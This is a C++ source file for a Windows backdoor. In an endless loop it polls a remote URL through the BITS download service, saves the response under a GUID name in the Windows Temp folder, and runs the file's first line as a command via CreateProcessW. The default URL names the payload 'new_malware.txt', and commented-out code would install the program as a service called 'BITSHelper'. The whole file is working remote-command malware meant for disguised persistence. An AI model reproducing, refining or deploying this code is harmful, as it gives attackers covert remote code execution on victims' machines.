#include <windows.h>
#include <bits.h>
#include <iostream>
#include <string>
#include <locale>
#include <codecvt>
#include <fstream>

#pragma comment(lib, "Bits.lib")

//SERVICE_STATUS ServiceStatus;
//SERVICE_STATUS_HANDLE hStatusHandle;
//
//void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
//{
//    switch (ctrlCode) {
//    case SERVICE_CONTROL_STOP:
//        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
//        SetServiceStatus(hStatusHandle, &ServiceStatus);
//        break;
//    default:
//        break;
//    }
//}

// Read a command from the file
std::wstring readCommentFromFile(const std::wstring& filePath) {
    std::wifstream file(filePath);  // Open file in wide-character mode

    // Check if file is opened successfully
    if (!file.is_open()) {
        std::wcerr << L"Error opening file: " << filePath << std::endl;
        return L"";  // Return empty string on error
    }

    std::wstring command;
    std::getline(file, command);  // Read the first line (which is assumed to be the comment)

    file.close();  // Close the file after reading

    return command;  // Return the command/comment read from the file
}

// Function to download the file using BITS API
void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) {
    HRESULT hr;
    IBackgroundCopyManager* pBitsManager = nullptr;
    IBackgroundCopyJob* pJob = nullptr;
    GUID jobId;

    // Initialize BITS Manager
    hr = CoCreateInstance(__uuidof(BackgroundCopyManager), nullptr, CLSCTX_LOCAL_SERVER,
        __uuidof(IBackgroundCopyManager), (void**)&pBitsManager);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to initialize BITS Manager. Error: " << std::hex << hr << std::endl;
        return;
    }

    // Create a new BITS job
    hr = pBitsManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to create BITS job. Error: " << std::hex << hr << std::endl;
        pBitsManager->Release();
        return;
    }

    // Add file to job
    hr = pJob->AddFile(remoteUrl.c_str(), localFile.c_str());
    if (FAILED(hr)) {
        std::wcerr << L"Failed to add file to BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    // Set the notification flags to notify when the job completes
    hr = pJob->SetNotifyFlags(BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to set notify flags. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    // Start the job
    hr = pJob->Resume();
    if (FAILED(hr)) {
        std::wcerr << L"Failed to start BITS job. Error: " << std::hex << hr << std::endl;
        pJob->Release();
        pBitsManager->Release();
        return;
    }

    std::wcout << L"Download started. Waiting for completion..." << std::endl;

    // Monitor job status
    BG_JOB_STATE state;
    do {
        Sleep(1000);  // Wait before checking again
        pJob->GetState(&state);
    } while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);

    // Check final state and handle completion
    if (state == BG_JOB_STATE_ERROR) {
        std::wcerr << L"BITS job encountered an error." << std::endl;
    }
    else if (state == BG_JOB_STATE_TRANSFERRED) {
        pJob->Complete();
        std::wcout << L"Download completed successfully!" << std::endl;

        std::wstring filePath = localFile;  // Path to the file with the ADS
        std::wstring command = readCommentFromFile(filePath);  // Read the command from the ADS

        if (!command.empty()) {
            std::wcout << L"Command from File: " << command << std::endl;

            if (command != L"wait") {
                // Now execute the command using CreateProcessW (if valid)
                STARTUPINFO si = { 0 };
                PROCESS_INFORMATION pi = { 0 };
                si.cb = sizeof(si);

                hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                if (hr == 0) {
                    std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
                }
                else {
                    // Wait for the process to exit (optional)
                    WaitForSingleObject(pi.hProcess, INFINITE);

                    // Close handles
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            else {
                std::wcout << L"No command yet, wainting" << std::endl;
            }
        }
        else {
            std::wcerr << L"No command found in File." << std::endl;
        }
    }
    else {
        std::wcerr << L"BITS job ended with unexpected state: " << state << std::endl;
    }

    // Cleanup
    pJob->Release();
    pBitsManager->Release();
}

//void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
//{
//    hStatusHandle = RegisterServiceCtrlHandler(L"BITSHelper", ServiceCtrlHandler);
//    if (hStatusHandle == NULL) {
//        return;
//    }
//
//    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
//    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
//    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
//    SetServiceStatus(hStatusHandle, &ServiceStatus);
//
//    // Start your executable logic here
//    
//}

int wmain(int argc, wchar_t* argv[]) {
    std::wstring remoteUrl = L"http://localhost:8080/updates/new_malware.txt";  // Default URL

    if (argc > 1) {
        remoteUrl = argv[1];  // Use the first command-line argument
    }

    std::wstring localFile = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Target file path

    wprintf(L"Using URL: %s\n", remoteUrl.c_str());
    
    /*SERVICE_TABLE_ENTRY ServiceTable[] = {
        { const_cast<LPWSTR>(L"BITSHelper"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;*/

    while (true) {
        CoInitialize(nullptr);
        DownloadFile(remoteUrl, localFile);
        CoUninitialize();
        Sleep(60000);
    }
}
